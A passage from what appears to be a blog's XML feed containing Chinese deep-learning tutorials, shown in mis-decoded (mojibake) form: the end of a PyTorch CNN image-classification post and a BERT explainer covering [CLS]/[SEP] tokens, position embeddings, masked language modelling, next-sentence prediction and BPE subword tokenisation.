class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Accuracy</span>: <span class="hljs-number">54</span> %<br></code></pre></td></tr></table></figure><p>å‡†ç¡®ç‡ä¸º54%ï¼Œè¯´æ˜æ¨¡å‹åˆæ­¥å…·å¤‡åˆ†ç±»èƒ½åŠ›ï¼Œè¿˜æœ‰è¾ƒå¤§æå‡ç©ºé—´ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è®¡ç®—æ¨¡å‹åœ¨å“ªäº›ç±»åˆ«ä¸Šè¡¨ç°æ›´å¥½ï¼Œåœ¨å“ªäº›ç±»åˆ«ä¸Šè¡¨ç°æ›´å·®ï¼Œä¹Ÿå¯ä»¥åˆ†ç±»åˆ«è¿›è¡Œå‡†ç¡®ç‡è®¡ç®—ï¼Œæ­¤å¤„ä¸å†æ¼”ç¤ºã€‚</p><p>æŠŠå­¦ä¹ ç‡ç”± 1e-3 ä¿®æ”¹ä¸º 1e-4, å¹¶ç½‘ç»œå‚æ•°é‡å¢åŠ å¦‚ä¸‹ä»£ç æ‰€ç¤º:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageClassification</span>(nn.Module):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(ImageClassification, self).__init__()<br>        self.conv1 = nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">32</span>, stride=<span class="hljs-number">1</span>, kernel_size=<span class="hljs-number">3</span>)<br>        self.pool1 = nn.MaxPool2d(kernel_size=<span class="hljs-number">2</span>, stride=<span class="hljs-number">2</span>)<br>        self.conv2 = nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>, stride=<span class="hljs-number">1</span>, kernel_size=<span class="hljs-number">3</span>)<br>        self.pool2 = nn.MaxPool2d(kernel_size=<span class="hljs-number">2</span>, stride=<span class="hljs-number">2</span>)<br>        self.linear1 = nn.Linear(<span class="hljs-number">128</span> * <span class="hljs-number">6</span> * <span class="hljs-number">6</span>, <span class="hljs-number">2048</span>)<br>        self.linear2 = nn.Linear(<span class="hljs-number">2048</span>, <span class="hljs-number">2048</span>)<br>        self.out = nn.Linear(<span class="hljs-number">2048</span>, <span class="hljs-number">10</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = F.relu(self.conv1(x))<br>        x = self.pool1(x)<br>        x = F.relu(self.conv2(x))<br>        x = self.pool2(x)<br>        <span class="hljs-comment"># ç”±äºæœ€åä¸€ä¸ªæ‰¹æ¬¡å¯èƒ½ä¸å¤Ÿ 32ï¼Œæ‰€ä»¥éœ€è¦æ ¹æ®æ‰¹æ¬¡æ•°é‡æ¥ flatten</span><br>        x = x.reshape(x.size(<span class="hljs-number">0</span>), -<span class="hljs-number">1</span>)<br>        x = F.relu(self.linear1(x))<br>        x = F.dropout(x, p=<span class="hljs-number">0.5</span>)<br>        x = F.relu(self.linear2(x))<br>        x = F.dropout(x, p=<span class="hljs-number">0.5</span>)<br>        <span class="hljs-keyword">return</span> self.out(x)<br></code></pre></td></tr></table></figure><p>ç»è¿‡è®­ç»ƒï¼Œæ¨¡å‹åœ¨æµ‹è¯•é›†çš„å‡†ç¡®ç‡ç”± 0.57ï¼Œæå‡åˆ°äº† 0.93ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BERT</title>
    <link href="/2024/03/18/BERT/"/>
    <url>/2024/03/18/BERT/</url>
    
    <content type="html"><![CDATA[<h1 id="BERTç®€è¿°"><a href="#BERTç®€è¿°" class="headerlink" title="BERTç®€è¿°"></a>BERTç®€è¿°</h1><p>BERTçš„å…¨ç¨‹ä¸º <em>Bidirectional Encoder Representation from Transformers</em> ï¼Œæ˜¯ä¸€ä¸ªåŸºäº Transformer æ¨¡å‹çš„é¢„è®­ç»ƒè¯­è¨€è¡¨å¾æ¨¡å‹ã€‚</p><p>BERTå¼ºè°ƒä¸å†é‡‡ç”¨ä¼ ç»Ÿçš„å•å‘è¯­è¨€æ¨¡å‹æˆ–è€…æŠŠä¸¤ä¸ªå•å‘è¯­è¨€æ¨¡å‹è¿›è¡Œæµ…å±‚æ‹¼æ¥çš„æ–¹æ³•è¿›è¡Œé¢„è®­ç»ƒï¼Œè€Œæ˜¯é‡‡ç”¨æ–°çš„ <em>masked language model(MLM)</em> ä»¥ç”Ÿæˆæ·±åº¦çš„åŒå‘è¯­è¨€è¡¨å¾ã€‚</p><h1 id="BERTçš„ç»“æ„"><a href="#BERTçš„ç»“æ„" class="headerlink" title="BERTçš„ç»“æ„"></a>BERTçš„ç»“æ„</h1><p>ä»¥å¾€çš„é¢„è®­ç»ƒæ¨¡å‹çš„ç»“æ„ä¼šå—åˆ°å•å‘è¯­è¨€æ¨¡å‹ï¼ˆä»å·¦åˆ°å³æˆ–è€…ä»å³åˆ°å·¦ï¼‰çš„é™åˆ¶ï¼Œå› è€Œä¹Ÿé™åˆ¶äº†æ¨¡å‹çš„è¡¨å¾èƒ½åŠ›ï¼Œä½¿å…¶åªèƒ½è·å–å•æ–¹å‘çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p><p>è€ŒBERTåˆ©ç”¨MLMè¿›è¡Œé¢„è®­ç»ƒå¹¶ä¸”é‡‡ç”¨æ·±å±‚çš„åŒå‘Transformerç»„ä»¶æ¥æ„å»ºæ•´ä¸ªæ¨¡å‹ï¼Œæœ€ç»ˆèƒ½å¤Ÿç”Ÿæˆèåˆå·¦å³ä¸Šä¸‹æ–‡ä¿¡æ¯çš„æ·±å±‚åŒå‘è¯­è¨€è¡¨å¾ã€‚</p><p><img src="/Pictures/DL/BERT/BERT.png" alt="BERT"></p><h2 id="è¾“å…¥ç»“æ„"><a href="#è¾“å…¥ç»“æ„" class="headerlink" title="è¾“å…¥ç»“æ„"></a>è¾“å…¥ç»“æ„</h2><p><img src="/Pictures/DL/BERT/input.png" alt="input"></p><p>BERTçš„è¾“å…¥ä¸ºæ¯ä¸€ä¸ªtokenå¯¹åº”çš„è¡¨å¾ï¼ˆå›¾ä¸­çš„ç²‰çº¢è‰²å—å°±æ˜¯tokenï¼Œé»„è‰²å—å°±æ˜¯tokenå¯¹åº”çš„è¡¨å¾ï¼‰ï¼Œå¹¶ä¸”å•è¯å­—å…¸æ˜¯é‡‡ç”¨ <strong>WordPiece</strong> ç®—æ³•æ¥è¿›è¡Œæ„å»ºçš„ã€‚</p><p>ä¸ºäº†å®Œæˆå…·ä½“çš„åˆ†ç±»ä»»åŠ¡ï¼Œé™¤äº†å•è¯çš„tokenä¹‹å¤–ï¼Œä½œè€…è¿˜åœ¨è¾“å…¥çš„æ¯ä¸€ä¸ªåºåˆ—å¼€å¤´éƒ½æ’å…¥ç‰¹å®šçš„åˆ†ç±»tokenï¼ˆ[CLS]ï¼‰ï¼Œè¯¥åˆ†ç±»tokenå¯¹åº”çš„æœ€åä¸€ä¸ªTransformerå±‚è¾“å‡ºè¢«ç”¨æ¥èµ·åˆ°èšé›†æ•´ä¸ªåºåˆ—è¡¨å¾ä¿¡æ¯çš„ä½œç”¨ã€‚</p><p>åˆ†è¾¨å“ªä¸ªèŒƒå›´æ˜¯å±äºå¥å­Aï¼Œå“ªä¸ªèŒƒå›´æ˜¯å±äºå¥å­Bå‘¢ï¼ŸBERTé‡‡ç”¨äº†ä¸¤ç§æ–¹æ³•å»è§£å†³ï¼š</p><ol><li><p>åœ¨åºåˆ—tokensä¸­æŠŠåˆ†å‰²tokenï¼ˆ[SEP]ï¼‰æ’å…¥åˆ°æ¯ä¸ªå¥å­åï¼Œä»¥åˆ†å¼€ä¸åŒçš„å¥å­tokensã€‚</p></li><li><p>ä¸ºæ¯ä¸€ä¸ªtokenè¡¨å¾éƒ½æ·»åŠ ä¸€ä¸ªå¯å­¦ä¹ çš„åˆ†å‰²embeddingæ¥æŒ‡ç¤ºå…¶å±äºå¥å­Aè¿˜æ˜¯å¥å­Bã€‚</p></li></ol><div class="note note-info">            <p>[CLS] tokenï¼š<br>CLS token æ˜¯ â€œClassificationâ€ token çš„ç¼©å†™ï¼Œå®ƒä½äºæ¯ä¸ªè¾“å…¥å¥å­çš„å¼€å¤´ã€‚è¿™ä¸ª token çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºå¥å­çš„åˆ†ç±»ä»»åŠ¡æä¾›ä¸€ä¸ªæ•´ä½“çš„å¥å­è¡¨ç¤ºã€‚åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œé€šå¸¸ä¼šå°†è¿™ä¸ª token çš„è¾“å‡ºä½œä¸ºæ•´ä¸ªå¥å­çš„è¡¨ç¤ºï¼Œç„¶åå°†å®ƒè¾“å…¥åˆ°åˆ†ç±»å™¨ä¸­è¿›è¡Œåˆ†ç±»ã€‚</p><p>[SEP] tokenï¼š<br>SEP token æ˜¯ â€œSeparationâ€ token çš„ç¼©å†™ï¼Œå®ƒç”¨äºåˆ†éš”ä¸¤ä¸ªå¥å­æˆ–è€…æ–‡æœ¬ç‰‡æ®µã€‚åœ¨è¾“å…¥å¥å­æˆ–æ–‡æœ¬ç‰‡æ®µä¹‹é—´éœ€è¦æ’å…¥ä¸€ä¸ª SEP tokenï¼Œä»¥å¸®åŠ©æ¨¡å‹æ›´å¥½åœ°ç†è§£å®ƒä»¬ä¹‹é—´çš„å…³ç³»ã€‚è¿™å¯¹äºBERTçš„åŒå¥å­ä»»åŠ¡ï¼ˆå¦‚å¥å¯¹åˆ†ç±»ã€é—®ç­”ç­‰ï¼‰æ˜¯éå¸¸é‡è¦çš„ã€‚</p>          </div><p>å¯¹äºæ¯ä¸ªTokenå¯¹åº”çš„è¡¨å¾ï¼Œæˆ‘ä»¬å°†å…¶åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯å¯¹åº”çš„Tokenï¼Œåˆ†å‰²å’ŒPosition Embeddings</p><p><img src="/Pictures/DL/BERT/features.png" alt="features"></p><p>æ­¤å¤„çš„position embeddingå’ŒTransformeræ¨¡å‹ä¸­çš„ä¸€è‡´ï¼Œç”±å…¬å¼ç»™å‡ºï¼š</p><p>$$ PE_{(pos,2i)} &#x3D; sin(pos &#x2F; 10000^{2i &#x2F; d})$$<br>$$ PE_{(pos,2i+1)} &#x3D; cos(pos &#x2F; 10000^{2i &#x2F; d})$$</p><p>åœ¨BERTæ¨¡å‹ä¸­ï¼Œä½ç½®åµŒå…¥æ˜¯é€šè¿‡ä»¥ä¸‹æ­¥éª¤ç”Ÿæˆçš„ï¼š</p><ol><li><p>ä½ç½®ç¼–ç çŸ©é˜µç”Ÿæˆ<br>é¦–å…ˆï¼ŒBERTæ¨¡å‹å­¦ä¹ ä¸€ä¸ªä½ç½®ç¼–ç çŸ©é˜µï¼Œå…¶ç»´åº¦ä¸º $\text{max_seq_length} \times \text{embedding_size}$ ï¼Œå…¶ä¸­ $\text{max_seq_length}$ æ˜¯è¾“å…¥åºåˆ—çš„æœ€å¤§é•¿åº¦ï¼Œ $\text{embedding_size}$ æ˜¯è¯åµŒå…¥çš„ç»´åº¦ã€‚</p></li><li><p>ä½ç½®ç¼–ç è®¡ç®—<br>å¯¹äºè¾“å…¥åºåˆ—ä¸­çš„æ¯ä¸ªä½ç½® $pos$ å’Œæ¯ä¸ªç»´åº¦ $i$ï¼Œä½ç½®åµŒå…¥ $PE(pos, i)$ è®¡ç®—å¦‚ä¸‹ï¼š<br>$$<br>  [<br>  PE(pos, 2i) &#x3D; \sin\left(\frac{pos}{10000^{2i &#x2F; d_{\text{model}}}}\right)<br>  ]<br>  [<br>  PE(pos, 2i+1) &#x3D; \cos\left(\frac{pos}{10000^{2i &#x2F; d_{\text{model}}}}\right)<br>  ]<br>$$<br>  å…¶ä¸­ï¼Œ$pos$ æ˜¯ä½ç½®ï¼Œ$i$ æ˜¯ç»´åº¦ï¼Œ $d_{\text{model}}$ æ˜¯è¯åµŒå…¥çš„ç»´åº¦ã€‚</p></li><li><p>ä½ç½®åµŒå…¥å‘é‡è·å–<br>å¯¹äºè¾“å…¥åºåˆ—ä¸­çš„æ¯ä¸ªè¯ï¼ˆæˆ–å­è¯ï¼‰ï¼Œé€šè¿‡ä½ç½®ç¼–ç çŸ©é˜µä¸­å¯¹åº”ä½ç½®çš„å€¼æ¥è·å–ä½ç½®åµŒå…¥å‘é‡ã€‚</p></li><li><p>ä½ç½®åµŒå…¥ä¸è¯åµŒå…¥ç›¸åŠ <br>å°†ä½ç½®åµŒå…¥å‘é‡ä¸è¯åµŒå…¥å‘é‡ç›¸åŠ ï¼Œå¾—åˆ°æœ€ç»ˆçš„è¾“å…¥å‘é‡ã€‚</p></li></ol><h2 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h2><p>ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼ŒBERTé‡‡ç”¨åŒå‘Encoderè¿›è¡Œè¿æ¥ï¼Œèˆå¼ƒäº†Decoderéƒ¨åˆ†ã€‚</p><p><img src="/Pictures/DL/BERT/encoder.png" alt="encoder"></p><p>æœ€åå‘ˆç°çš„è¾“å‡ºä¸ºï¼š</p><p><img src="/Pictures/DL/BERT/output.png" alt="output"></p><p>$C$ ä¸ºåˆ†ç±»tokenï¼ˆ[CLS]ï¼‰å¯¹åº”æœ€åä¸€ä¸ªTransformerçš„è¾“å‡ºï¼Œ $T_{i}$ åˆ™ä»£è¡¨å…¶ä»–tokenå¯¹åº”æœ€åä¸€ä¸ªTransformerçš„è¾“å‡ºã€‚å¯¹äºä¸€äº›tokençº§åˆ«çš„ä»»åŠ¡ï¼ˆå¦‚ï¼Œåºåˆ—æ ‡æ³¨å’Œé—®ç­”ä»»åŠ¡ï¼‰ï¼Œå°± $T_{i}$ æŠŠè¾“å…¥åˆ°é¢å¤–çš„è¾“å‡ºå±‚ä¸­è¿›è¡Œé¢„æµ‹ã€‚å¯¹äºä¸€äº›å¥å­çº§åˆ«çš„ä»»åŠ¡ï¼ˆå¦‚ï¼Œè‡ªç„¶è¯­è¨€æ¨æ–­å’Œæƒ…æ„Ÿåˆ†ç±»ä»»åŠ¡ï¼‰ï¼Œå°±æŠŠ $C$ è¾“å…¥åˆ°é¢å¤–çš„è¾“å‡ºå±‚ä¸­ï¼Œè¿™é‡Œä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆè¦åœ¨æ¯ä¸€ä¸ªtokenåºåˆ—å‰éƒ½è¦æ’å…¥ç‰¹å®šçš„åˆ†ç±»tokenã€‚</p><h1 id="BERTçš„é¢„è®­ç»ƒä»»åŠ¡"><a href="#BERTçš„é¢„è®­ç»ƒä»»åŠ¡" class="headerlink" title="BERTçš„é¢„è®­ç»ƒä»»åŠ¡"></a>BERTçš„é¢„è®­ç»ƒä»»åŠ¡</h1><p>BERTæ„å»ºäº†ä¸¤ä¸ªé¢„è®­ç»ƒä»»åŠ¡ï¼Œåˆ†åˆ«æ˜¯ <em>Masked Language Model</em> å’Œ <em>Next Sentence Prediction</em></p><h2 id="Masked-Language-Model-MLM"><a href="#Masked-Language-Model-MLM" class="headerlink" title="Masked Language Model(MLM)"></a>Masked Language Model(MLM)</h2><p>MLMæ˜¯BERTèƒ½å¤Ÿä¸å—å•å‘è¯­è¨€æ¨¡å‹æ‰€é™åˆ¶çš„åŸå› ã€‚ç®€å•æ¥è¯´å°±æ˜¯ä»¥15%çš„æ¦‚ç‡ç”¨mask token ï¼ˆ[MASK]ï¼‰éšæœºåœ°å¯¹æ¯ä¸€ä¸ªè®­ç»ƒåºåˆ—ä¸­çš„tokenè¿›è¡Œæ›¿æ¢ï¼Œç„¶åé¢„æµ‹å‡º[MASK]ä½ç½®åŸæœ‰çš„å•è¯ã€‚ç„¶è€Œï¼Œç”±äº[MASK]å¹¶ä¸ä¼šå‡ºç°åœ¨ä¸‹æ¸¸ä»»åŠ¡çš„å¾®è°ƒï¼ˆfine-tuningï¼‰é˜¶æ®µï¼Œå› æ­¤é¢„è®­ç»ƒé˜¶æ®µå’Œå¾®è°ƒé˜¶æ®µä¹‹é—´äº§ç”Ÿäº†ä¸åŒ¹é…ï¼ˆè¿™é‡Œå¾ˆå¥½è§£é‡Šï¼Œå°±æ˜¯é¢„è®­ç»ƒçš„ç›®æ ‡ä¼šä»¤äº§ç”Ÿçš„è¯­è¨€è¡¨å¾å¯¹[MASK]æ•æ„Ÿï¼Œä½†æ˜¯å´å¯¹å…¶ä»–tokenä¸æ•æ„Ÿï¼‰ã€‚å› æ­¤BERTé‡‡ç”¨äº†ä»¥ä¸‹ç­–ç•¥æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p><p>é¦–å…ˆåœ¨æ¯ä¸€ä¸ªè®­ç»ƒåºåˆ—ä¸­ä»¥15%çš„æ¦‚ç‡éšæœºåœ°é€‰ä¸­æŸä¸ªtokenä½ç½®ç”¨äºé¢„æµ‹ï¼Œå‡å¦‚æ˜¯ç¬¬iä¸ªtokenè¢«é€‰ä¸­ï¼Œåˆ™ä¼šè¢«æ›¿æ¢æˆä»¥ä¸‹ä¸‰ä¸ªtokenä¹‹ä¸€</p><ol><li><p>80%çš„æ—¶å€™æ˜¯[MASK]ã€‚å¦‚ï¼Œmy dog is hairyâ€”â€”&gt;my dog is [MASK]</p></li><li><p>10%çš„æ—¶å€™æ˜¯éšæœºçš„å…¶ä»–tokenã€‚å¦‚ï¼Œmy dog is hairyâ€”â€”&gt;my dog is apple</p></li><li><p>10%çš„æ—¶å€™æ˜¯åŸæ¥çš„tokenï¼ˆä¿æŒä¸å˜ï¼‰ã€‚å¦‚ï¼Œmy dog is hairyâ€”â€”&gt;my dog is hairy</p></li></ol><p>å†ç”¨è¯¥ä½ç½®å¯¹åº”çš„ $T_{i}$ å»é¢„æµ‹å‡ºåŸæ¥çš„tokenï¼ˆè¾“å…¥åˆ°å…¨è¿æ¥ï¼Œç„¶åç”¨softmaxè¾“å‡ºæ¯ä¸ªtokençš„æ¦‚ç‡ï¼Œæœ€åç”¨äº¤å‰ç†µè®¡ç®—lossï¼‰ã€‚</p><h2 id="Next-Sentence-Prediction"><a href="#Next-Sentence-Prediction" class="headerlink" title="Next Sentence Prediction"></a>Next Sentence Prediction</h2><p>åœ¨NLPä¸­æœ‰ä¸€ç±»é‡è¦çš„é—®é¢˜æ¯”å¦‚QA(Quention-Answer), NLI(Natural Language Inference), éœ€è¦æ¨¡å‹èƒ½å¤Ÿå¾ˆå¥½çš„ç†è§£ä¸¤ä¸ªå¥å­ä¹‹é—´çš„å…³ç³», ä»è€Œéœ€è¦åœ¨æ¨¡å‹çš„è®­ç»ƒä¸­å¼•å…¥å¯¹åº”çš„ä»»åŠ¡. åœ¨BERTä¸­å¼•å…¥çš„å°±æ˜¯Next Sentence Predictionä»»åŠ¡ã€‚é‡‡ç”¨çš„æ–¹å¼æ˜¯è¾“å…¥å¥å­å¯¹(A, B), æ¨¡å‹æ¥é¢„æµ‹å¥å­Bæ˜¯ä¸æ˜¯å¥å­Açš„çœŸå®çš„ä¸‹ä¸€å¥è¯ã€‚</p><p>æ‰€æœ‰å‚ä¸ä»»åŠ¡è®­ç»ƒçš„è¯­å¥éƒ½è¢«é€‰ä¸­ä½œä¸ºå¥å­Aã€‚</p><ol><li><p>å…¶ä¸­50%çš„Bæ˜¯åŸå§‹æ–‡æœ¬ä¸­çœŸå®è·ŸéšAçš„ä¸‹ä¸€å¥è¯. (æ ‡è®°ä¸ºIsNext, ä»£è¡¨æ­£æ ·æœ¬)</p></li><li><p>å…¶ä¸­50%çš„Bæ˜¯åŸå§‹æ–‡æœ¬ä¸­éšæœºæŠ½å–çš„ä¸€å¥è¯. (æ ‡è®°ä¸ºNotNext, ä»£è¡¨è´Ÿæ ·æœ¬)</p></li></ol><p>åœ¨ä»»åŠ¡äºŒä¸­, BERTæ¨¡å‹å¯ä»¥åœ¨æµ‹è¯•é›†ä¸Šå–å¾—97%-98%çš„å‡†ç¡®ç‡ã€‚</p><h1 id="è¡¥å……ï¼šNLPä¸‰å¤§Subwordæ¨¡å‹"><a href="#è¡¥å……ï¼šNLPä¸‰å¤§Subwordæ¨¡å‹" class="headerlink" title="è¡¥å……ï¼šNLPä¸‰å¤§Subwordæ¨¡å‹"></a>è¡¥å……ï¼šNLPä¸‰å¤§Subwordæ¨¡å‹</h1><p>åœ¨NLPä»»åŠ¡ä¸­ï¼Œç¥ç»ç½‘ç»œæ¨¡å‹çš„è®­ç»ƒå’Œé¢„æµ‹éƒ½éœ€è¦å€ŸåŠ©è¯è¡¨æ¥å¯¹å¥å­è¿›è¡Œè¡¨ç¤ºã€‚ä¼ ç»Ÿæ„é€ è¯è¡¨çš„æ–¹æ³•ï¼Œæ˜¯å…ˆå¯¹å„ä¸ªå¥å­è¿›è¡Œåˆ†è¯ï¼Œç„¶åå†ç»Ÿè®¡å¹¶é€‰å‡ºé¢‘æ•°æœ€é«˜çš„å‰Nä¸ªè¯ç»„æˆè¯è¡¨ã€‚<br>è¿™ç§æ–¹æ³•æ„é€ çš„è¯è¡¨å­˜åœ¨ç€å¦‚ä¸‹çš„é—®é¢˜ï¼š</p><ul><li><p>å®é™…åº”ç”¨ä¸­ï¼Œæ¨¡å‹é¢„æµ‹çš„è¯æ±‡æ˜¯å¼€æ”¾çš„ï¼Œå¯¹äºæœªåœ¨è¯è¡¨ä¸­å‡ºç°çš„è¯(Out Of Vocabulary, OOV)ï¼Œæ¨¡å‹å°†æ— æ³•å¤„ç†åŠç”Ÿæˆ</p></li><li><p>è¯è¡¨ä¸­çš„ä½é¢‘è¯&#x2F;ç¨€ç–è¯åœ¨æ¨¡å‹è®­ç»ƒè¿‡ç¨‹ä¸­æ— æ³•å¾—åˆ°å……åˆ†è®­ç»ƒï¼Œè¿›è€Œæ¨¡å‹ä¸èƒ½å……åˆ†ç†è§£è¿™äº›è¯çš„è¯­ä¹‰</p></li><li><p>ä¸€ä¸ªå•è¯å› ä¸ºä¸åŒçš„å½¢æ€ä¼šäº§ç”Ÿä¸åŒçš„è¯ï¼Œå¦‚ç”±â€lookâ€è¡ç”Ÿå‡ºçš„â€looksâ€, â€œlookingâ€, â€œlookedâ€ï¼Œæ˜¾ç„¶è¿™äº›è¯å…·æœ‰ç›¸è¿‘çš„æ„æ€ï¼Œä½†æ˜¯åœ¨è¯è¡¨ä¸­è¿™äº›è¯ä¼šè¢«å½“ä½œä¸åŒçš„è¯å¤„ç†ï¼Œä¸€æ–¹é¢å¢åŠ äº†è®­ç»ƒå†—ä½™ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿé€ æˆäº†å¤§è¯æ±‡é‡é—®é¢˜</p></li></ul><h2 id="Byte-Pair-Encoding-BPE"><a href="#Byte-Pair-Encoding-BPE" class="headerlink" title="Byte Pair Encoding (BPE)"></a>Byte Pair Encoding (BPE)</h2><p>BPEè·å¾—Subwordçš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å‡†å¤‡è¶³å¤Ÿå¤§çš„è®­ç»ƒè¯­æ–™ï¼Œå¹¶ç¡®å®šæœŸæœ›çš„Subwordè¯è¡¨å¤§å°ï¼›</li><li>å°†å•è¯æ‹†åˆ†ä¸ºæˆæœ€å°å•å…ƒã€‚æ¯”å¦‚è‹±æ–‡ä¸­26ä¸ªå­—æ¯åŠ ä¸Šå„ç§ç¬¦å·ï¼Œè¿™äº›ä½œä¸ºåˆå§‹è¯è¡¨ï¼›</li><li>åœ¨è¯­æ–™ä¸Šç»Ÿè®¡å•è¯å†…ç›¸é‚»å•å…ƒå¯¹çš„é¢‘æ•°ï¼Œé€‰å–é¢‘æ•°æœ€é«˜çš„å•å…ƒå¯¹åˆå¹¶æˆæ–°çš„Subwordå•å…ƒï¼›</li><li>é‡å¤ç¬¬3æ­¥ç›´åˆ°è¾¾åˆ°ç¬¬1æ­¥è®¾å®šçš„Subwordè¯è¡¨å¤§å°æˆ–ä¸‹ä¸€ä¸ªæœ€é«˜é¢‘æ•°ä¸º1.</li></ol><p>ä¸‹é¢ä»¥ä¾‹å­è¯´æ˜ã€‚å‡è®¾æˆ‘ä»¬æœ‰è¿™æ ·ä¸€ä¸ªè¯­æ–™ï¼š{â€˜lowâ€™:5,â€™lowerâ€™:2,â€™newestâ€™:6,â€™widestâ€™:3}<br>å…¶ä¸­æ•°å­—ä»£è¡¨å¯¹åº”å•è¯çš„å‡ºç°é¢‘æ•°ã€‚</p><ol><li>æ‹†åˆ†å•è¯æˆæœ€å°å•å…ƒï¼Œå¹¶åˆå§‹åŒ–è¯è¡¨ã€‚è¿™é‡Œï¼Œæœ€å°å•å…ƒä¸ºå­—ç¬¦ï¼Œå› è€Œï¼Œå¯å¾—åˆ°</li></ol><p><img src="/Pictures/DL/BERT/step1.png" alt="step1"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å°†å•è¯æ‹†åˆ†æˆæœ€å°å•å…ƒæ—¶ï¼Œè¦åœ¨å•è¯åºåˆ—ååŠ ä¸Šâ€œ</w>â€(å…·ä½“å®ç°ä¸Šå¯ä»¥ä½¿ç”¨å…¶å®ƒç¬¦å·)æ¥è¡¨ç¤ºä¸­æ­¢ç¬¦ã€‚åœ¨å­è¯è§£ç æ—¶ï¼Œä¸­æ­¢ç¬¦å¯ä»¥åŒºåˆ†å•è¯è¾¹ç•Œã€‚</p><ol start="2"><li>åœ¨è¯­æ–™ä¸Šç»Ÿè®¡ç›¸é‚»å•å…ƒçš„é¢‘æ•°ã€‚è¿™é‡Œï¼Œæœ€é«˜é¢‘è¿ç»­å­è¯å¯¹â€eâ€å’Œâ€sâ€å‡ºç°äº†6+3&#x3D;9æ¬¡ï¼Œå°†å…¶åˆå¹¶æˆâ€esâ€ï¼Œæœ‰</li></ol><p><img src="/Pictures/DL/BERT/step2.png" alt="step2"></p><p>ç”±äºè¯­æ–™ä¸­ä¸å­˜åœ¨â€™sâ€™å­è¯äº†ï¼Œå› æ­¤å°†å…¶ä»è¯è¡¨ä¸­åˆ é™¤ã€‚åŒæ—¶åŠ å…¥æ–°çš„å­è¯â€™esâ€™ã€‚ä¸€å¢ä¸€å‡ï¼Œè¯è¡¨å¤§å°ä¿æŒä¸å˜ã€‚</p><ol start="3"><li>ç»§ç»­ç»Ÿè®¡ç›¸é‚»å­è¯çš„é¢‘æ•°ã€‚æ­¤æ—¶ï¼Œæœ€é«˜é¢‘è¿ç»­å­è¯å¯¹â€esâ€å’Œâ€tâ€å‡ºç°äº†6+3&#x3D;9æ¬¡, å°†å…¶åˆå¹¶æˆâ€estâ€ï¼Œæœ‰</li></ol><p><img src="/Pictures/DL/BERT/step3.png" alt="step3"></p><ol start="4"><li>ç»§ç»­ä¸Šè¿°è¿­ä»£ç›´åˆ°è¾¾åˆ°é¢„è®¾çš„Subwordè¯è¡¨å¤§å°æˆ–ä¸‹ä¸€ä¸ªæœ€é«˜é¢‘çš„å­—èŠ‚å¯¹å‡ºç°é¢‘ç‡ä¸º1</li></ol><p>ä»ä¸Šé¢çš„ç¤ºä¾‹å¯ä»¥çŸ¥é“ï¼Œæ¯æ¬¡åˆå¹¶åè¯è¡¨å¤§å°å¯èƒ½å‡ºç°3ç§å˜åŒ–ï¼š</p><ul><li>+1ï¼Œè¡¨æ˜åŠ å…¥åˆå¹¶åçš„æ–°å­è¯ï¼ŒåŒæ—¶åŸæ¥çš„2ä¸ªå­è¯è¿˜ä¿ç•™ï¼ˆ2ä¸ªå­—è¯åˆ†å¼€å‡ºç°åœ¨è¯­æ–™ä¸­ï¼‰ã€‚</li><li>+0ï¼Œè¡¨æ˜åŠ å…¥åˆå¹¶åçš„æ–°å­è¯ï¼ŒåŒæ—¶åŸæ¥çš„2ä¸ªå­è¯ä¸­ä¸€ä¸ªä¿ç•™ï¼Œä¸€ä¸ªè¢«æ¶ˆè§£ï¼ˆä¸€ä¸ªå­è¯å®Œå…¨éšç€å¦ä¸€ä¸ªå­è¯çš„å‡ºç°è€Œç´§è·Ÿç€å‡ºç°ï¼‰ã€‚</li><li>-1ï¼Œè¡¨æ˜åŠ å…¥åˆå¹¶åçš„æ–°å­è¯ï¼ŒåŒæ—¶åŸæ¥çš„2ä¸ªå­è¯éƒ½è¢«æ¶ˆè§£ï¼ˆ2ä¸ªå­—è¯åŒæ—¶è¿ç»­å‡ºç°ï¼‰ã€‚</li></ul><p>åœ¨å¾—åˆ°Subwordè¯è¡¨åï¼Œé’ˆå¯¹æ¯ä¸€ä¸ªå•è¯ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„æ–¹å¼æ¥è¿›è¡Œç¼–ç 